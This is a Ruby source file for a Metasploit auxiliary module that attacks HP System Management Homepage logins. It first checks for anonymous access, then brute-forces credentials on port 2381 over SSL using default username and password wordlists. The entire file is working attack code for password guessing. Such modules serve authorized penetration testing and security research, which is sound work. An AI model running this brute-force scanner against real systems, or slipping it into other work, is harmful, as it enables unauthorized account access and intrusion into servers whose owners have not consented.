##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#load "/Users/wchen/rapid7/msf/lib/metasploit/framework/login_scanner/smh.rb"

require 'msf/core'
require 'metasploit/framework/login_scanner/smh'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HP System Management Homepage Login Utility",
      'Description'    => %q{
        This module attempts to login to HP System Management Homepage using host
        operating system authentication.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 2381,
          'USERPASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt"),
          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
        }
    ))
  end

  def anonymous_access?
    res = send_request_raw({'uri' => '/'})
    return true if res and res.body =~ /username = "hpsmh_anonymous"/
    false
  end

  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    @scanner = Metasploit::Framework::LoginScanner::Smh.new(
      host:               ip,
      port:               rport,
      uri:                datastore['URI'],
      proxies:            datastore["PROXIES"],
      cred_details:       @cred_collection,
      stop_on_success:    datastore['STOP_ON_SUCCESS'],
      connection_timeout: 5
    )

    @scanner.ssl         = datastore['SSL']
    @scanner.ssl_version = datastore['SSLVERSION']
  end


  def run_host(ip)
    if anonymous_access?
      print_status("#{peer} - No login necessary. Server allows anonymous access.")
      return
    end

    init_loginscanner(ip)

    @scanner.scan! do |result|
      print_debug(result.status)
    end
  end
end

